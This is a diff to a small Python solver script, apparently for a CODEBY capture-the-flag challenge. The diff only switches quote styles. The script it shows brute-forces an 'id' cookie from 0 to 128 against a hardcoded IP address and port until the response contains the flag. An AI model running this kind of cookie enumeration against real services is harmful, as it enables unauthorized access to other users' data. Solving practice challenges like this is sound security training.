@@ -8,17 +8,17 @@ def get_flag() -> str:
     :return: Flag
     """
 
-    base_url = 'http://62.173.140.174'
+    base_url = "http://62.173.140.174"
     port = 16003
 
-    flag = ''
+    flag = ""
 
     for i in range(129):
-        cookies = {'id': f'{i}'}
+        cookies = {"id": f"{i}"}
 
-        response = get(f'{base_url}:{port}', cookies=cookies).text.split('\n')
+        response = get(f"{base_url}:{port}", cookies=cookies).text.split("\n")
 
-        if 'CODEBY' in response[-1]:
+        if "CODEBY" in response[-1]:
             flag = response[-1][12:]
             break
         else:
@@ -27,5 +27,5 @@ def get_flag() -> str:
     return flag
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     print(get_flag())
